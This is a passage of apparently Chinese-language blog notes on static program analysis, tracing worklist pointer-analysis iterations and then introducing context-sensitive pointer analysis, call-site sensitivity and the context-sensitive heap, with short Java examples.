pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(a) = pt(n) = pts ⋃ pt(n) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227145905255.png" alt="image-20230227145905255"></p>

        <h6 id="第二次迭代-4"   >
          <a href="#第二次迭代-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#第二次迭代-4" class="headerlink" title="第二次迭代"></a>第二次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;b,&#123;O4&#125;&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;A.main()&#125;;</span><br><span class="line">CG = &#123;&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = b;</span><br><span class="line">pts = &#123;O4&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O4&#125; - &#123;&#125; = &#123;O4&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O4&#125;;</span><br><span class="line">	pt(b) = pt(n) = pts ⋃ pt(n) = &#123;O4&#125; ⋃ &#123;&#125; = &#123;O4&#125;;</span><br><span class="line">	PFG没有关于b-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于a的成员没有相关Load和Store</span><br><span class="line"></span><br><span class="line">ProcessCall(x,Oi):</span><br><span class="line">	m = B.foo(A);</span><br><span class="line">	WL += &lt;B.foo/this,&#123;O4&#125;&gt;;</span><br><span class="line">	CG += &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">	AddReachable(m):</span><br><span class="line">		RM += &#123;B.foo(A)&#125;;</span><br><span class="line">		WL += &lt;r,O11&gt;;</span><br><span class="line">		没有关于r的Load操作，退出函数</span><br><span class="line">	AddEdge:</span><br><span class="line">		PFG += &#123;a-&gt;y&#125;;</span><br><span class="line">		PFG += &#123;r-&gt;c&#125;;</span><br></pre></td></tr></table></div></figure>

<p>最终结果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227151348799.png" alt="image-20230227151348799"></p>

        <h6 id="第三次迭代-3"   >
          <a href="#第三次迭代-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#第三次迭代-3" class="headerlink" title="第三次迭代"></a>第三次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;B.foo/this,&#123;O4&#125;&gt;;</span><br><span class="line">WL = [&lt;r,&#123;O11&#125;&gt;,&lt;y,O3&gt;];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = B.foo/this;</span><br><span class="line">pts = &#123;O4&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O4&#125; - &#123;&#125; = &#123;O4&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O4&#125;;</span><br><span class="line">	pt(B.foo/this) = pt(n) = pts ⋃ pt(n) = &#123;O4&#125; ⋃ &#123;&#125; = &#123;O4&#125;;</span><br><span class="line">	PFG没有关于B.foo/this-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于B.foo/this的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>最终结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227152241402.png" alt="image-20230227152241402"></p>

        <h6 id="第四次迭代-1"   >
          <a href="#第四次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第四次迭代-1" class="headerlink" title="第四次迭代"></a>第四次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;r,&#123;O11&#125;&gt;;</span><br><span class="line">WL = [&lt;y,O3&gt;];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = r;</span><br><span class="line">pts = &#123;O11&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O11&#125; - &#123;&#125; = &#123;O11&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O11&#125;;</span><br><span class="line">	pt(r) = pt(n) = pts ⋃ pt(r) = &#123;O11&#125; ⋃ &#123;&#125; = &#123;O11&#125;;</span><br><span class="line">	WL += &lt;c,&#123;O11&#125;&gt;;</span><br><span class="line"></span><br><span class="line">关于c的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下:</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227152605132.png" alt="image-20230227152605132"></p>

        <h6 id="第五次迭代-1"   >
          <a href="#第五次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五次迭代-1" class="headerlink" title="第五次迭代"></a>第五次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;y,O3&gt;;</span><br><span class="line">WL = [&lt;c,&#123;O11&#125;&gt;];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = y;</span><br><span class="line">pts = &#123;O3&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O3&#125; - &#123;&#125; = &#123;O3&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O3&#125;;</span><br><span class="line">	pt(y) = pt(n) = pts ⋃ pt(y) = &#123;O3&#125; ⋃ &#123;&#125; = &#123;O3&#125;;</span><br><span class="line">	PFG没有关于y-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于y的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227152843432.png" alt="image-20230227152843432"></p>

        <h6 id="第六次迭代-1"   >
          <a href="#第六次迭代-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#第六次迭代-1" class="headerlink" title="第六次迭代"></a>第六次迭代</h6>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Processing = &lt;c,O11&gt;;</span><br><span class="line">WL = [];</span><br><span class="line">RM = &#123;A.main(),B.foo(A)&#125;;</span><br><span class="line">CG = &#123;5-&gt;B.foo(A)&#125;;</span><br><span class="line">PFG = &#123;...&#125;;</span><br><span class="line">n = c;</span><br><span class="line">pts = &#123;O11&#125;;</span><br><span class="line">Δ = pts - pt(n) = &#123;O11&#125; - &#123;&#125; = &#123;O11&#125;;</span><br><span class="line"></span><br><span class="line">Propagate(n,Δ):</span><br><span class="line">	pts = Δ = &#123;O11&#125;;</span><br><span class="line">	pt(c) = pt(n) = pts ⋃ pt(c) = &#123;O11&#125; ⋃ &#123;&#125; = &#123;O11&#125;;</span><br><span class="line">	PFG没有关于c-&gt;x的流向</span><br><span class="line"></span><br><span class="line">关于c的成员没有相关Load和Store以及call操作，循环结束</span><br></pre></td></tr></table></div></figure>

<p>结果如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227153003163.png" alt="image-20230227153003163"></p>
<p>至此整个算法结束，得到最终结果<code>CG</code>和<code>PFG</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227153105750.png" alt="image-20230227153105750"></p>

        <h2 id="总结-4"   >
          <a href="#总结-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-4" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227154718912.png" alt="image-20230227154718912"></p>
<p>理解对于方法调用的指针分析规则，理解过程间的指针分析算法，以及两者相互依赖的情况。</p>

        <h1 id="十、Pointer-Analysis-Context-Sensitivity-I"   >
          <a href="#十、Pointer-Analysis-Context-Sensitivity-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、Pointer-Analysis-Context-Sensitivity-I" class="headerlink" title="十、Pointer Analysis Context Sensitivity (I)"></a>十、Pointer Analysis Context Sensitivity (I)</h1>
      
        <h2 id="Problem-of-Context-Insensitive-Pointer-Analysis"   >
          <a href="#Problem-of-Context-Insensitive-Pointer-Analysis" class="heading-link"><i class="fas fa-link"></i></a><a href="#Problem-of-Context-Insensitive-Pointer-Analysis" class="headerlink" title="Problem of Context-Insensitive  Pointer Analysis"></a>Problem of Context-Insensitive  Pointer Analysis</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Number n1, n2, x, y;</span><br><span class="line">    n1 = <span class="keyword">new</span> One(); <span class="comment">// O1</span></span><br><span class="line">    n2 = <span class="keyword">new</span> Two(); <span class="comment">// O2</span></span><br><span class="line">    x = id(n1);</span><br><span class="line">    y = id(n2);</span><br><span class="line">    <span class="keyword">int</span> i = x.get();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Number <span class="title">id</span><span class="params">(Number n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">get</span><span class="params">()</span></span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">One</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">1</span>; &#125;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Two</span> <span class="keyword">implements</span> <span class="title">Number</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">get</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">2</span>; &#125;&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p><code>Context-Insensitive</code>：如果利用之前学到的指针分析进行分析的话，就会导致对于<code>id</code>函数的返回值<code>n</code>，其会包含两个对象，即<code>&#123;O1,O2&#125;</code>。从而导致<code>n-&gt;x,y</code>的流向中，会将<code>&#123;O1,O2&#125;</code>传递给<code>x,y</code>，导致<code>x,y</code>也包含两个对象，如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227161326592.png" alt="image-20230227161326592"></p>
<p>那么在后续的调用中，<code>int i = x.get();</code>这代码进行常量传播分析时，就会导致<code>i = NAC</code>，这是错误的结果，不准确。</p>
</li>
<li><p><code>Context sensitivity</code>：利用上下文敏感进行分析的话，将每一次的函数调用分为不同的情况进行分析，这样就可以得到如下精确的<code>PFG</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227161537640.png" alt="image-20230227161537640"></p>
<p>这样进行常量传播分析时就能得到精确的结果了。</p>
</li>
</ul>

        <h2 id="1-Introduction"   >
          <a href="#1-Introduction" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Introduction" class="headerlink" title="1.Introduction"></a>1.Introduction</h2>
      
        <h3 id="Imprecision-of-Context-Insensitivity-C-I"   >
          <a href="#Imprecision-of-Context-Insensitivity-C-I" class="heading-link"><i class="fas fa-link"></i></a><a href="#Imprecision-of-Context-Insensitivity-C-I" class="headerlink" title="Imprecision of Context Insensitivity (C.I.)"></a>Imprecision of Context Insensitivity (C.I.)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227162348110.png" alt="image-20230227162348110"></p>
<p>依据之前的例子也可以看出来，一个函数每一次调用时，其上下文，数据流等可能会不同，那么其结果也可能会不同。而不敏感的分析中，这些所有的结果都会混合到一起，即混合到该函数的返回变量中，这样就会导致混合的数据流传播时污染了其他的数据流，导致虚假的一些信息。</p>

        <h3 id="Context-Sensitivity-C-S"   >
          <a href="#Context-Sensitivity-C-S" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-Sensitivity-C-S" class="headerlink" title="Context Sensitivity (C.S.)"></a>Context Sensitivity (C.S.)</h3>
      
        <h4 id="call-site-sensitivity-call-string"   >
          <a href="#call-site-sensitivity-call-string" class="heading-link"><i class="fas fa-link"></i></a><a href="#call-site-sensitivity-call-string" class="headerlink" title="call-site  sensitivity (call-string)"></a>call-site  sensitivity (call-string)</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227163406069.png" alt="image-20230227163406069"></p>
<p>比较古老以及好理解的一种方法，即某点调用时，它的上下文即为<code>Call Site</code>。比如如下的代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227163018057.png" alt="image-20230227163018057"></p>
<p>对于<code>id</code>方法而言有两个上下文：<code>[1]</code>和<code>[2]</code>，进行调用时就会作克隆标记，方法为<code>Cloning-Based</code>进行分析</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227163523979.png" alt="image-20230227163523979"></p>

        <h3 id="Context-Sensitive-Heap"   >
          <a href="#Context-Sensitive-Heap" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-Sensitive-Heap" class="headerlink" title="Context-Sensitive Heap"></a>Context-Sensitive Heap</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227165115263.png" alt="image-20230227165115263"></p>
<p>用以提高精度，将创建的对象依据上下文进行更加细粒的区分</p>
<figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Y y = <span class="keyword">new</span> Y(<span class="number">1</span>);</span><br><span class="line">    X a = newX(y);</span><br><span class="line">    </span><br><span class="line">    y = <span class="keyword">new</span> Y(<span class="number">2</span>);</span><br><span class="line">    X b = newX(y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">X <span class="title">newX</span><span class="params">(Y y)</span> </span>&#123;</span><br><span class="line">    X x = <span class="keyword">new</span> X();</span><br><span class="line">    x.f = y;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>比如上述代码中，如果使用<code>C.I.</code>进行分析，那么无论什么时候调用函数<code>newX</code>，最后都只会得到一个对象<code>O_10</code>。但是如果在<code>C.S.</code>中使用该方法进行细粒化，就可以在不同的调用点对<code>O_10</code>进行区分，比如这里就可以将<code>O_10</code>分为<code>C3:O_10</code>和<code>C6:O_10</code>，类似如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227165502792.png" alt="image-20230227165502792"></p>
<p>这样就精度更高，避免数据流的混合。</p>

        <h4 id="实际例子-1"   >
          <a href="#实际例子-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#实际例子-1" class="headerlink" title="实际例子"></a>实际例子</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227170232579.png" alt="image-20230227170232579"></p>
<p>其实通过上述图片可以大概推导出来，在<code>C.S.heap</code>的技术中，主要是针对传入的上下文做一个标记，标记出不同上下文下得到的对象，这样就可以更加精确。</p>
<p><code>C.S.heap</code>要和<code>C.S.</code>共同使用才能发挥作用，<code>C.S.heap</code>和<code>C.I.</code>是不能发挥作用的，如下例子所示。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227171052291.png" alt="image-20230227171052291"></p>

        <h2 id="2-Context-Sensitive-Pointer-Analysis-Rules"   >
          <a href="#2-Context-Sensitive-Pointer-Analysis-Rules" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Context-Sensitive-Pointer-Analysis-Rules" class="headerlink" title="2.Context Sensitive Pointer Analysis: Rules"></a>2.Context Sensitive Pointer Analysis: Rules</h2>
      
        <h3 id="Domain"   >
          <a href="#Domain" class="heading-link"><i class="fas fa-link"></i></a><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227171524578.png" alt="image-20230227171524578"></p>
<p>主要加入了一个修饰符<code>c</code>，表示上下文</p>

        <h3 id="Rules"   >
          <a href="#Rules" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172158603.png" alt="image-20230227172158603"></p>
<p>类似之前的一些规则表格</p>

        <h4 id="Rule-New-1"   >
          <a href="#Rule-New-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-New-1" class="headerlink" title="Rule: New"></a>Rule: New</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172536628.png" alt="image-20230227172536628"></p>
<p>这个就很容易理解了</p>

        <h4 id="Rule-Assign-1"   >
          <a href="#Rule-Assign-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Assign-1" class="headerlink" title="Rule: Assign"></a>Rule: Assign</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172807051.png" alt="image-20230227172807051"></p>
<p>这个也容易理解</p>

        <h4 id="Rule-Store-1"   >
          <a href="#Rule-Store-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Store-1" class="headerlink" title="Rule: Store"></a>Rule: Store</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227172917941.png" alt="image-20230227172917941"></p>
<p>容易理解，就是理清楚各个变量指向对象的上下文<code>C</code>在哪里</p>

        <h4 id="Rule-Load-1"   >
          <a href="#Rule-Load-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Load-1" class="headerlink" title="Rule: Load"></a>Rule: Load</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227173015546.png" alt="image-20230227173015546"></p>
<p>类似的</p>

        <h4 id="小总结"   >
          <a href="#小总结" class="heading-link"><i class="fas fa-link"></i></a><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227173051279.png" alt="image-20230227173051279"></p>

        <h4 id="Rule-Call-1"   >
          <a href="#Rule-Call-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rule-Call-1" class="headerlink" title="Rule: Call"></a>Rule: Call</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227174623063.png" alt="image-20230227174623063"></p>
<p>当进行方法调用时，<code>Dispatch</code>求解函数，然后<code>Select</code>得到上下文之后，就可以对应进行相关变量的值，或者指针对象传递了。和之前也差不多，就是加入了相关的上下文。</p>

        <h2 id="总结-5"   >
          <a href="#总结-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230227174951813.png" alt="image-20230227174951813"></p>
<p>理解<code>context sensitivity (C.S.)</code>以及<code>context-sensitive heap (C.S. heap)</code>的相关概念，以及这些方法为什么能够提升精度。关键点就是经过相同的代码，但是其上下文可能不同，如果混合了数据流就会比较虚假，所以需要进行精确区分上下文。</p>
<p><code>C.S.</code>指针分析的规则。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302105604591.png" alt="image-20230302105604591"></p>

        <h1 id="十一、Pointer-Analysis-Context-Sensitivity-II"   >
          <a href="#十一、Pointer-Analysis-Context-Sensitivity-II" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、Pointer-Analysis-Context-Sensitivity-II" class="headerlink" title="十一、Pointer Analysis Context Sensitivity (II)"></a>十一、Pointer Analysis Context Sensitivity (II)</h1>
      <p>一些小的回顾就不说了</p>

        <h2 id="3-Context-Sensitive-Pointer-Analysis-Algorithms"   >
          <a href="#3-Context-Sensitive-Pointer-Analysis-Algorithms" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-Context-Sensitive-Pointer-Analysis-Algorithms" class="headerlink" title="3.Context Sensitive Pointer Analysis: Algorithms"></a>3.Context Sensitive Pointer Analysis: Algorithms</h2>
      <p>主体框架、流程和原来的差不多，加入上下文敏感了。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302111205711.png" alt="image-20230302111205711"></p>
<p>首先是一些概念，和之前类似，加入了上下文</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302111745720.png" alt="image-20230302111745720"></p>
<p>具体例子如下</p>
<ul>
<li><p><code>RM</code></p>
<p>即<code>reachable methods</code>可达方法集合中所有方法都会有上下文，下面的就代表在<code>Ct</code>上下文下可达的方法。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302111827518.png" alt="image-20230302111827518"></p>
</li>
<li><p><code>CG</code></p>
<p>即<code>call graph</code>调用图中，如下<code>c</code>代表在调用时的上下文<br>$$<br>c:2\ \ \ \ \ \ c^t:T.foo(A,A)∈CG<br>$$<br><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302112047551.png" alt="image-20230302112047551"></p>
</li>
</ul>

        <h3 id="AddReachable-𝑐-𝑚"   >
          <a href="#AddReachable-𝑐-𝑚" class="heading-link"><i class="fas fa-link"></i></a><a href="#AddReachable-𝑐-𝑚" class="headerlink" title="AddReachable(𝑐:𝑚)"></a>AddReachable(𝑐:𝑚)</h3>
      <p>最开始进入的入口函数为<code>[]:m_entry</code>，此时没有什么上下文，所以就为<code>[]</code>，其他的和之前类似，加入上下文</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302113019796.png" alt="image-20230302113019796"></p>

        <h3 id="AddEdge-Propagate"   >
          <a href="#AddEdge-Propagate" class="heading-link"><i class="fas fa-link"></i></a><a href="#AddEdge-Propagate" class="headerlink" title="AddEdge/Propagate"></a>AddEdge/Propagate</h3>
      <p>和原先的一样，不需要怎么管</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302114824189.png" alt="image-20230302114824189"></p>
<p>因为<code>Propaget</code>传播依据现有的<code>PFG</code>进行传播，不需要管上下文。而<code>AddEdge</code>连边也是一样的，只是在<code>PFG</code>中连上两条边，并且指导后续的<code>WL</code>工作进度，不需要上下文。</p>

        <h3 id="Load-Store"   >
          <a href="#Load-Store" class="heading-link"><i class="fas fa-link"></i></a><a href="#Load-Store" class="headerlink" title="Load/Store"></a>Load/Store</h3>
      <p>主要看主体部分的<code>Load/Store</code>部分</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302141214011.png" alt="image-20230302141214011"></p>
<p>需要注意到图中用红色框起来的部分，每一个<code>c:x</code>和对应的<code>c:y</code>的上下文是一样的，这个应该也不难理解，因为传递的是指针对象集合，其包含的上下文也应该是一样的，不然可能不同的上下文导致不同的对象，其<code>field</code>也会可能发生改变。</p>

        <h3 id="ProcessCall-𝑐-𝑥-𝑐′-O𝑖"   >
          <a href="#ProcessCall-𝑐-𝑥-𝑐′-O𝑖" class="heading-link"><i class="fas fa-link"></i></a><a href="#ProcessCall-𝑐-𝑥-𝑐′-O𝑖" class="headerlink" title="ProcessCall(𝑐:𝑥, 𝑐′:O𝑖)"></a>ProcessCall(𝑐:𝑥, 𝑐′:O𝑖)</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302142028418.png" alt="image-20230302142028418"></p>
<p>加入相关上下文，以及一个<code>Select(c,l,c&#39;:Oi)</code>这样一个用来选择上下文的函数，该函数依据自己的算法设计，进行上下文的选择，比如选中多个<code>lable</code>等，用来唯一标识，这个后面会详细讲一下。</p>
<p>注：该算法大多不涉及循环处理，因为开销比较大。其他领域有这个方面的。</p>

        <h2 id="4-Context-Sensitivity-Variants"   >
          <a href="#4-Context-Sensitivity-Variants" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-Context-Sensitivity-Variants" class="headerlink" title="4.Context Sensitivity Variants"></a>4.Context Sensitivity Variants</h2>
      <p>主要讲<code>Select</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302143554661.png" alt="image-20230302143554661"></p>
<p>如上所示，各种上下文都可能会被考虑到。</p>

        <h3 id="Context-Insensitivity"   >
          <a href="#Context-Insensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Context-Insensitivity" class="headerlink" title="Context Insensitivity"></a>Context Insensitivity</h3>
      <p>其实对于<code>C.I.</code>这个技术而言，其本质就可以当作是<code>Select</code>选择出来的上下文为空，即</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302144056744.png" alt="image-20230302144056744"></p>

        <h3 id="Call-Site-Sensitivity"   >
          <a href="#Call-Site-Sensitivity" class="heading-link"><i class="fas fa-link"></i></a><a href="#Call-Site-Sensitivity" class="headerlink" title="Call-Site Sensitivity"></a>Call-Site Sensitivity</h3>
      <p><code>Olin Shivers, 1991. “Control-Flow Analysis of Higher-Order Languages”.  Ph.D. Dissertation. Carnegie Mellon University.</code>论文提出，方法叫做<code>Call-Site Sensitivity</code> ，或者<code>call-string  Sensitivity</code>，或者<code>k-CFA(Control-Flow Analysis)</code></p>
<p>其实就是一个<code>call chain</code>调用链，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302144152217.png" alt="image-20230302144152217"></p>
<p>即当进行<code>ProcessCall</code>的<code>Select</code>时，做的工作就是一个并集，将当前的调用点加入到之前的上下文中，形成当前新的上下文，调试程序的时候就经常可以看到，提供的例子如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230302144545841.png" alt="image-20230302144545841"></p>
<p>但是这种有递归的情况中，由于每次碰到新的上下文方法，都会进行分析，所以就会导致分析出无穷无尽的调用链和对应的调用方法，那么就需要引入一个能够进行终止的方法<code>k-Call-Site Sensitivity/k-CFA</code>。</p>

        <h3 id="k-Call-Site-Sensitivity-k-CFA"   >
